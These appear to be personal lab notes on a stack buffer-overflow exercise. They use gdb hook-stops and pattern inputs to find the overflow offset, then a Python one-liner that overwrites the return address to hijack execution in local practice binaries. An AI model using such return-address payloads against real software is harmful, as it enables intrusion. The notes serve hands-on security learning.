Found ebp address, and the func return address using hook-stops
define hook-stop
x/x $ebp
x/54x $esp
info registers
end

this runs on various breakpoints to allow us to check the stack and find those return addresses

dissassemble main to check the addresses

run AAAABBBBCCCCDDDDEEEE etc allows us to exactly where the buffer overflows
run AAAABBBBCZZZZDDDD allows us to validate

dissassemble overflowtest to find the address 
0x0804843b
inverted due to little endian gives the following command
run $(python -c 'print "A"*9 + "\x3b\x84\x04\x08"')

Execution Hijacked is printed, program crashes.

For overflow2.o in command line ./overflow2.o $(python -c 'print "A"*14 + "\x3b\x84\x04\x08"')
